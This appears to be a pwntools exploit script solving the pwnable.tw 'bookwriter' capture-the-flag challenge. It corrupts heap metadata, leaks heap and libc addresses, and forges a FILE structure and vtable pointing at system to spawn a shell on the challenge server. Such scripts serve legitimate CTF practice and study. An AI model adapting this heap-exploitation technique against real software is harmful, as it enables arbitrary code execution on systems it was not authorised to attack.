from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './bookwriter_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN, level='debug') # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw', 10304) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *main')


#
# ##########################
# ##### OFFSET FINDER ######
# ##########################
#
# OFFSET = b'' #b'A'*264
# if OFFSET == b'':
#     gdb.attach(P.pid, 'c') #Attach and continue
#     payload = cyclic(264)
#     payload += b'AAAAAAAA'
#     print(P.clean())
#     P.sendline(payload)
#     #x/wx  -- Search for bytes that crashed the application
#     #print(cyclic_find(0x63616171)) # Find the offset of those bytes
#     P.interactive()
#     exit()
#
#
#
# #####################
# #### Find Gadgets ###
# #####################
# try:
#     libc_func = 'puts'
#     PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
# except:
#     libc_func = 'printf'
#     PUTS_PLT = ELF_LOADED.plt['printf']
#
# MAIN_PLT = ELF_LOADED.symbols['main']
# POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
# RET = (ROP_LOADED.find_gadget(['ret']))[0]
#
# log.info('Main start: ' + hex(MAIN_PLT))
# log.info('Puts plt: ' + hex(PUTS_PLT))
# log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
# log.info('ret gadget: ' + hex(RET))
#
#
# #########################
#### Finf LIBC offset ###
#########################


##########################
##### FUNCTION ######
##########################

def add(size, content):
    P.sendlineafter(b'choice :',b'1')
    P.sendlineafter(b'page :',str(size).encode())
    P.sendafter(b'Content :', content)


def changeAuthor(name):
        P.sendlineafter(b'choice :',b'4')
        P.sendlineafter(b'author ?',b'1')
        P.sendlineafter(b'Author :', name)


def viewAuthor():
    P.sendlineafter(b'choice :', b'4')
    P.recvuntil(b'aA')
    heap_leak = u64(P.recvline().strip().ljust(8, b'\x00'))
    print(hex(heap_leak))
    P.sendlineafter(b'author ?', b'0')
    return heap_leak


def edit(index, content):
        P.sendlineafter(b'choice :',b'3')
        P.sendlineafter(b'page :', str(index).encode())
        P.sendafter(b'Content:', content)


def show(index):
        P.sendlineafter(b'choice :',b'2')
        P.sendlineafter(b'page :', str(index).encode())


##############################
##### FINAL EXPLOITATION #####
##############################
P.sendafter(b'Author :',b'a'*0x3f+b'A')
add(0x18,b'a'*0x18)                     #0
edit(0,b'a'*0x18)
edit(0,b'a'*0x18+b'\xe1\x0f\x00')
add(0x1000,b'abcd')                     #1
add(0x40,b'aaaaaaaa')                   #2
heap_leak = viewAuthor()
show(2)
P.recvuntil(b'aaaaaaaa')
LIBC.address = u64(P.recvline().strip().ljust(8,b'\x00'))-0x3c4188
print(hex(LIBC.address))
io_list_all_addr = LIBC.symbols['_IO_list_all']
edit(0,b'\x00')
for i in range(3,9):
    add(0x18,b'a'*0x8)

vtable_address=heap_leak+0x120+0xe0


fake_chunk = b''
fake_chunk += b'/bin/sh\x00'+p64(0x61)
fake_chunk += p64(0)+p64(io_list_all_addr-0x10)
fake_chunk += p64(2)+p64(3)
fake_chunk += p64(0)*21
fake_chunk += p64(vtable_address)

vtable = b''
vtable += p64(0)*3
vtable += p64(LIBC.sym['system'])
"""VTABLE
{
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7ffff7e530d0 <_IO_new_file_finish>,
  __overflow = 0x7ffff7e53f00 <_IO_new_file_overflow>,
  __underflow = 0x7ffff7e53ba0 <_IO_new_file_underflow>,
  __uflow = 0x7ffff7e550d0 <__GI__IO_default_uflow>,
  __pbackfail = 0x7ffff7e56800 <__GI__IO_default_pbackfail>,
  __xsputn = 0x7ffff7e52750 <_IO_new_file_xsputn>,
  __xsgetn = 0x7ffff7e523c0 <__GI__IO_file_xsgetn>,
  __seekoff = 0x7ffff7e519e0 <_IO_new_file_seekoff>,
  __seekpos = 0x7ffff7e55780 <_IO_default_seekpos>,
  __setbuf = 0x7ffff7e516b0 <_IO_new_file_setbuf>,
  __sync = 0x7ffff7e51540 <_IO_new_file_sync>,
  __doallocate = 0x7ffff7e44df0 <__GI__IO_file_doallocate>,
  __read = 0x7ffff7e52720 <__GI__IO_file_read>,
  __write = 0x7ffff7e51fe0 <_IO_new_file_write>,
  __seek = 0x7ffff7e51780 <__GI__IO_file_seek>,
  __close = 0x7ffff7e516a0 <__GI__IO_file_close>,
  __stat = 0x7ffff7e51fc0 <__GI__IO_file_stat>,
  __showmanyc = 0x7ffff7e56990 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7e569a0 <_IO_default_imbue>
}
"""



payload = b'\x00'*0x120
payload += fake_chunk
payload += vtable






edit(0,payload)
P.interactive()

"""file = {
    _flags = 0xfbad2086,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7fac6a0 <_IO_2_1_stdout_>,
    _fileno = 0x2,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "",
    _lock = 0x7ffff7fae4b0 <_IO_stdfile_2_lock>,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7fab780 <_IO_wide_data_2>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7fad4a0 <_IO_file_jumps>
}
"""









